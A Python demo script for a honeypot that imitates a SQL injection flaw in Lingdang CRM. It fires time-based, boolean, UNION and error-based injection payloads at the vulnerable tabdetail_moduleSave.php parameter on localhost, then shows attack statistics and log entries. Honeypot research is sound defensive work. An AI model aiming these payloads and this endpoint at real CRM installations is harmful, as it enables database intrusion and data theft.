#!/usr/bin/env python3
"""
Demonstration script for Lingdang CRM SQL Injection Honeypot

This script demonstrates the key features of the honeypot including:
- Time-based SQL injection detection and simulation
- Boolean-based SQL injection responses  
- Attack logging and statistics
- Realistic CRM interface simulation

Usage: python3 demo.py
"""

import subprocess
import time
import requests
import json
import sys
from concurrent.futures import ThreadPoolExecutor
import signal

def start_honeypot():
    """Start the honeypot server"""
    print("🚀 Starting Lingdang CRM Honeypot...")
    process = subprocess.Popen([
        sys.executable, "lingdang_crm_honeypot.py"
    ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    # Wait a moment for the server to start
    time.sleep(3)
    
    # Test if server is responding
    try:
        response = requests.get("http://localhost:8080/crm/", timeout=5)
        if response.status_code == 200:
            print("✅ Honeypot is running on http://localhost:8080")
            return process
        else:
            print("❌ Honeypot failed to start properly")
            process.terminate()
            return None
    except requests.RequestException:
        print("❌ Could not connect to honeypot")
        process.terminate()
        return None

def demonstrate_attacks():
    """Demonstrate various SQL injection attacks"""
    
    base_url = "http://localhost:8080"
    endpoint = f"{base_url}/crm/crmapi/erp/tabdetail_moduleSave.php"
    
    print("\n" + "="*70)
    print("🎭 DEMONSTRATING SQL INJECTION ATTACKS")
    print("="*70)
    
    attacks = [
        {
            'name': 'Time-based Blind SQL Injection (Original Exploit)',
            'payload': "'||(SELECT SLEEP(3))--+-",
            'description': 'Causes 3-second delay, simulating database query execution time'
        },
        {
            'name': 'Boolean-based SQL Injection (True)',
            'payload': "' OR 1=1-- -",
            'description': 'Always true condition, may return more data'
        },
        {
            'name': 'Boolean-based SQL Injection (False)',
            'payload': "' OR 1=2-- -", 
            'description': 'Always false condition, may return less data'
        },
        {
            'name': 'Union-based SQL Injection',
            'payload': "' UNION SELECT version(),user(),database()-- -",
            'description': 'Attempt to extract database information'
        },
        {
            'name': 'Error-based SQL Injection',
            'payload': "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
            'description': 'Forces database error to extract information'
        }
    ]
    
    for i, attack in enumerate(attacks, 1):
        print(f"\n{i}. {attack['name']}")
        print(f"   📝 {attack['description']}")
        print(f"   🎯 Payload: {attack['payload']}")
        
        try:
            start_time = time.time()
            response = requests.get(
                endpoint,
                params={'getvaluestring': attack['payload']},
                timeout=15
            )
            elapsed_time = time.time() - start_time
            
            print(f"   ⏱️  Response Time: {elapsed_time:.2f}s")
            print(f"   📊 HTTP Status: {response.status_code}")
            
            if elapsed_time > 2.5:
                print(f"   🚨 TIME DELAY DETECTED - Honeypot simulated vulnerable behavior!")
            
            # Try to parse JSON response
            try:
                json_data = response.json()
                print(f"   📄 Response Type: JSON")
                if 'data' in json_data and len(json_data['data']) > 0:
                    print(f"   📋 Data Records: {len(json_data['data'])}")
            except:
                if response.text:
                    print(f"   📄 Response Type: HTML/Text ({len(response.text)} chars)")
        
        except requests.exceptions.Timeout:
            print(f"   ⏰ REQUEST TIMED OUT - Likely time-based attack detected!")
        except requests.exceptions.RequestException as e:
            print(f"   ❌ Request failed: {e}")

def show_statistics():
    """Display honeypot statistics"""
    print("\n" + "="*70)
    print("📊 HONEYPOT STATISTICS")
    print("="*70)
    
    try:
        response = requests.get("http://localhost:8080/stats", timeout=5)
        if response.status_code == 200:
            stats = response.json()
            
            print(f"🎯 Total Attacks Detected: {stats.get('total_attacks', 0)}")
            print(f"🌐 Unique Attacker IPs: {stats.get('unique_attackers', 0)}")
            print(f"🔍 Detection Patterns: {stats.get('patterns_detected', 0)}")
            print(f"🏷️  Honeypot Version: {stats.get('honeypot_version', 'Unknown')}")
            
            if stats.get('top_attackers'):
                print(f"\n🥇 Top Attackers:")
                for ip, count in stats['top_attackers'][:5]:
                    print(f"   {ip}: {count} attempts")
        else:
            print("❌ Could not retrieve statistics")
    
    except requests.RequestException as e:
        print(f"❌ Failed to get statistics: {e}")

def show_log_samples():
    """Show sample log entries"""
    print("\n" + "="*70)
    print("📋 SAMPLE LOG ENTRIES")
    print("="*70)
    
    try:
        with open("logs/honeypot.log", "r") as f:
            lines = f.readlines()
            
        print(f"📁 Total log entries: {len(lines)}")
        print(f"🔗 Log location: logs/honeypot.log")
        print(f"\n📝 Recent entries:")
        
        # Show last few entries
        for line in lines[-3:]:
            if "WARNING" in line or "SQL Injection" in line:
                print(f"🚨 {line.strip()}")
            elif "INFO" in line:
                print(f"ℹ️  {line.strip()}")
    
    except FileNotFoundError:
        print("❌ Log file not found")
    except Exception as e:
        print(f"❌ Error reading logs: {e}")

def simulate_concurrent_attacks():
    """Simulate multiple concurrent attacks"""
    print("\n" + "="*70)
    print("⚡ SIMULATING CONCURRENT ATTACKS")
    print("="*70)
    
    def send_attack(attack_id):
        payload = f"' OR SLEEP({attack_id}) AND 1=1-- -"
        try:
            start = time.time()
            response = requests.get(
                "http://localhost:8080/crm/crmapi/erp/tabdetail_moduleSave.php",
                params={'getvaluestring': payload},
                timeout=15
            )
            elapsed = time.time() - start
            return f"Attack {attack_id}: {response.status_code} ({elapsed:.2f}s)"
        except Exception as e:
            return f"Attack {attack_id}: Failed - {e}"
    
    print("🚀 Launching 5 concurrent SQL injection attacks...")
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = [executor.submit(send_attack, i) for i in range(1, 6)]
        results = [future.result() for future in futures]
    
    for result in results:
        print(f"   {result}")

def main():
    """Main demonstration function"""
    print("""
╔══════════════════════════════════════════════════════════════╗
║           Lingdang CRM SQL Injection Honeypot Demo          ║
║                        CVE-2025-9140                         ║
║                                                              ║
║  This demo showcases the honeypot's detection capabilities   ║
║  for the Lingdang CRM SQL injection vulnerability.          ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    # Start honeypot
    process = start_honeypot()
    if not process:
        print("❌ Failed to start honeypot")
        return
    
    try:
        # Demonstrate attacks
        demonstrate_attacks()
        
        # Show concurrent attacks
        simulate_concurrent_attacks()
        
        # Display statistics
        show_statistics()
        
        # Show log samples
        show_log_samples()
        
        print("\n" + "="*70)
        print("✅ DEMONSTRATION COMPLETE")
        print("="*70)
        print("🔗 Access honeypot at: http://localhost:8080/crm/")
        print("📊 View statistics at: http://localhost:8080/stats")
        print("📋 Check logs in: logs/honeypot.log")
        print("\n⚠️  Remember: This is a honeypot for research purposes only!")
        print("🛑 Press Ctrl+C to stop the honeypot")
        
        # Keep running until interrupted
        while True:
            time.sleep(1)
    
    except KeyboardInterrupt:
        print("\n\n🛑 Stopping honeypot...")
        process.terminate()
        process.wait()
        print("✅ Honeypot stopped")

if __name__ == "__main__":
    main()